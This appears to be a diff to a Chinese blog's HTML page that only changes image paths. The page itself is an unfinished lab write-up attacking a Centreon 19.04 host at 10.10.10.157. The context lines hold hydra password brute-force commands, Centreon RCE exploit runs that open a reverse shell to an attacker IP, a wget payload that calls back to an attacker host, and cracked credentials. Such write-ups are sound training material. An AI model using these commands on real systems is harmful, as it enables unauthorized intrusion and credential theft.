@@ -233,10 +233,10 @@
 <p>最近太忙了ORZ，这篇没做完…</p>
 <h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><p>22，80</p>
 <p>Apache/2.4.29 (Ubuntu) Server </p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/1.PNG" srcset="/img/loading.gif" alt="1"><br>说明用户名可能是admin</p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/1.PNG" srcset="/img/loading.gif" alt="1"><br>说明用户名可能是admin</p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /usr/share/wordlists<br> <span class="hljs-attribute">hydra</span> -l admin -P rockyou.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br><br> <span class="hljs-attribute">hydra</span> -l admin -P <span class="hljs-number">3000</span>-pass.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br> <span class="hljs-attribute">hydra</span> -l panel -P rockyou.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br> <span class="hljs-attribute">hydra</span> -l aa -P rockyou.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br></code></pre></div></td></tr></table></figure>
 <h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/6.PNG" srcset="/img/loading.gif" alt="6"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/6.PNG" srcset="/img/loading.gif" alt="6"></p>
 <hr>
 <p>searchsploit -m exploits/linux/remote/45233.py<br>python 45233.py（type error代码错误）</p>
 <p>searchsploit -m exploits/linux/remote/45210.py<br>python 45210.py (TypeError)</p>
@@ -252,25 +252,25 @@
 <p>10.10.10.157/monitoring/../../../../../../../../../etc/passwd<br>无效</p>
 <hr>
 <p>get改post请求，绕过登陆页面。</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/7.PNG" srcset="/img/loading.gif" alt="7"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/7.PNG" srcset="/img/loading.gif" alt="7"></p>
 <p>searchsploit centreon</p>
 <p>searchsploit -m exploitdb/exploits/php/webapps/47069.py<br>v. 19.04.0</p>
 <p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py">exp下载地址</a></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/8.PNG" srcset="/img/loading.gif" alt="8"></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/9.PNG" srcset="/img/loading.gif" alt="9"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/8.PNG" srcset="/img/loading.gif" alt="8"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/9.PNG" srcset="/img/loading.gif" alt="9"></p>
 <p><code>python3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330</code></p>
 <p>执行后报错，于是修改exp。</p>
 <figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">。。。。。。<br>  poller_soup = BeautifulSoup(poller_html)<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;47069.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">57</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br>    poller_token = poller_soup.findAll(<span class="hljs-string">&#x27;input&#x27;</span>)[<span class="hljs-number">24</span>].<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;value&quot;</span>)<br>IndexError: <span class="hljs-keyword">list</span> <span class="hljs-built_in">index</span> out of <span class="hljs-built_in">range</span><br></code></pre></div></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/10.PNG" srcset="/img/loading.gif" alt="10"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/10.PNG" srcset="/img/loading.gif" alt="10"></p>
 <p>poller_token = poller_soup.find(‘input’, {‘name’: ‘centreon_token’}).get(‘value’)</p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/11.PNG" srcset="/img/loading.gif" alt="11"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/11.PNG" srcset="/img/loading.gif" alt="11"></p>
 <p>python3 centreon-exploit.py <a target="_blank" rel="noopener" href="http://10.10.10.157/centreon">http://10.10.10.157/centreon</a> admin passwd1 IP 8080</p>
 <p>反弹shell失败</p>
 <p>修改后，无报错的exp地址：<a target="_blank" rel="noopener" href="https://github.com/Whale3070/ctf-coding/blob/master/47069.py">https://github.com/Whale3070/ctf-coding/blob/master/47069.py</a></p>
 <h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p>python3 47069.py <a target="_blank" rel="noopener" href="http://10.10.10.157/centreon">http://10.10.10.157/centreon</a> admin password1 10.10.14.18 8081</p>
 <hr>
 <p><a target="_blank" rel="noopener" href="http://10.10.10.157/centreon/Themes/Centreon-2/">http://10.10.10.157/centreon/Themes/Centreon-2/</a></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/12.PNG" srcset="/img/loading.gif" alt="12"><br>目录遍历漏洞</p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/12.PNG" srcset="/img/loading.gif" alt="12"><br>目录遍历漏洞</p>
 <hr>
 <ul>
 <li><a target="_blank" rel="noopener" href="http://10.10.10.157/centreon/a.php">http://10.10.10.157/centreon/a.php</a> (CODE:200|SIZE:1)                                                   </li>
@@ -281,15 +281,15 @@
 <hr>
 <p>测试命令执行是否成功，修改payload为</p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.10</span>:<span class="hljs-number">888</span>/<span class="hljs-number">1</span>.txt <span class="hljs-comment">#</span><br></code></pre></div></td></tr></table></figure>
-<p>失败<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/13.PNG" srcset="/img/loading.gif" alt="13"></p>
+<p>失败<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/13.PNG" srcset="/img/loading.gif" alt="13"></p>
 <hr>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hydra -L <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt  -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -V -s <span class="hljs-number">80</span> <br><br><span class="hljs-number">10.10</span>.<span class="hljs-number">10.157</span> http-post-form <span class="hljs-string">&quot;/centreon/index.php:useralias=^USER^&amp;password=^PASS^&amp;submitLogin=Connect&amp;centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.&quot;</span><br><br>hydra -l centreon  -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -V -s <span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.157</span> http-post-form <span class="hljs-string">&quot;/centreon/index.php:useralias=^USER^&amp;password=^PASS^&amp;submitLogin=Connect&amp;centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.&quot;</span><br><br>hydra -l admin  -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -V -s <span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.157</span> http-post-form <span class="hljs-string">&quot;/centreon/index.php:useralias=^USER^&amp;password=^PASS^&amp;submitLogin=Connect&amp;centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.&quot;</span> -t <span class="hljs-number">4</span><br><br>admin/password1<br>centreon/<span class="hljs-comment">#1bitch</span><br></code></pre></div></td></tr></table></figure>
 
 <h2 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h2><p>centreon 19.04 rce<br>后台弱口令<br>apache目录遍历</p>
 <h2 id="根据python-exp手动利用漏洞"><a href="#根据python-exp手动利用漏洞" class="headerlink" title="根据python exp手动利用漏洞"></a>根据python exp手动利用漏洞</h2><p>19.04 版本漏洞<br><a target="_blank" rel="noopener" href="https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html">https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html</a></p>
 <p>开启burp，首先访问<a target="_blank" rel="noopener" href="http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1">http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1</a></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/17.PNG" srcset="/img/loading.gif" alt="17"></p>
-<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/images/11-09-09/16.PNG" srcset="/img/loading.gif" alt="16"><br>注意图中的testpath</p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/17.PNG" srcset="/img/loading.gif" alt="17"></p>
+<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/16.PNG" srcset="/img/loading.gif" alt="16"><br>注意图中的testpath</p>
 <p>待续</p>
 
             </div>
